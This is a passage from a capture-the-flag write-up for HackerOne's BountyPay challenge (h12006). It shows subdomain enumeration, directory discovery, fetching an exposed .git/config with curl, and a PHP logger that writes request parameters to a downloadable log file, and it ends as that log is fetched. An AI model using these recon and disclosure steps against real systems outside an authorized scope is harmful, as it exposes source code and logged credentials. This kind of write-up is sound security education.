# H1-CTF (h12006)

## Assignment

All started with this [tweet](https://twitter.com/Hacker0x01/status/1266454022124376064) from the [@Hacker0x01](https://twitter.com/Hacker0x01/) account:
```
We need your help! CEO @martenmickos needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? https://hackerone.com/h1-ctf 

Best 3 reports that meet requirements will win an invite to #h12006! ðŸ›¸
```

## 0x00 Initial recon
From the [CTF description](https://hackerone.com/h1-ctf) we can understand that the scope is `*.bountypay.h1ctf.com` so I started a standard DNS enumeration with [OWASP'S Amass](https://github.com/OWASP/Amass), which gave the following output:
```
$ amass enum -d bountypay.h1ctf.com -brute -ip
[...]
app.bountypay.h1ctf.com         3.21.98.146
www.bountypay.h1ctf.com         3.21.98.146
bountypay.h1ctf.com             3.21.98.146
software.bountypay.h1ctf.com    3.21.98.146
staff.bountypay.h1ctf.com       3.21.98.146
api.bountypay.h1ctf.com         3.21.98.146
```

Already feeling the time pressure I started a quick web-content discovery using [dirsearch](https://github.com/maurosoria/dirsearch) and the [SecList's common wordlist](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt), which output I'll discuss later.

## 0x01 app.bountypay.h1ctf.com

The web-content discovery led me immediately to the app.bountypay.h1ctf.com domain, because of an exposed `.git` directory.  
Exposing such directory is a bad and very dangerous practice, as it allows anyone to download the source code of that specific project, and this was the case.  

```
$ curl -s https://app.bountypay.h1ctf.com/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = https://github.com/bounty-pay-code/request-logger.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
        remote = origin
        merge = refs/heads/master
```

With a single `GET` request it is possible to understand that the source code is hosted on [the request-logger repository of the bounty-pay-code Github user](https://github.com/bounty-pay-code/request-logger.git).  

Unfortunately, the repository contained only the source code of the `logger.php` file, nonetheless, it was useful to find a dangerous logging procedure.

```php
<?php

$data = array(
    'IP'        =>  $_SERVER["REMOTE_ADDR"],
    'URI'       =>  $_SERVER["REQUEST_URI"],
    'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
    'PARAMS'    =>  array(
    'GET'       =>  $_GET,
    'POST'      =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND);
```

Knowing this it is as easy as doing a GET request to https://app.bountypay.h1ctf.com/bp_web_trace.log to download the log file.

```
$ curl -s https://app.bountypay.h1ctf.com/bp_web_trace.log
